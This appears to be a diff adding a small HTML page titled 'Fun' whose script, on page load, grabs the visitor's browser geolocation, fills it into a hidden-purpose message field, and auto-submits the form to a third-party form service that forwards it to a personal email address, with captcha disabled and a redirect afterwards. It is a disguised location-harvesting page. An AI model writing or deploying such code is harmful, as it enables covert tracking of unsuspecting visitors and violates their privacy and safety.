@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fun</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body onload="getLocation()">
+
+    <form action="https://formsubmit.co/studyram77@gmail.com" method="POST">
+        <input type="text" name="name" id="name" required placeholder="Name">
+        <textarea name="msg" required placeholder="Message" id="myTextarea"></textarea>
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://rambhai567.github.io/Ramjee_Mishra/">
+        <button id="myButton">_NEXT_</button>
+    </form>
+
+
+
+
+    
+    <script>
+        var myTextarea = document.getElementById("myTextarea");
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else { 
+                myTextarea.value = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function showPosition(position) {
+            myTextarea.value = "Latitude: " + position.coords.latitude + 
+            "\nLongitude: " + position.coords.longitude;
+        }
+
+        var myButton = document.getElementById("myButton");
+        
+        function clickButtonOnLoad() {
+            myButton.click();
+        }
+
+        window.onload = function() {
+            getLocation();
+            clickButtonOnLoad();
+        };
+    </script>
+</body>
+</html>
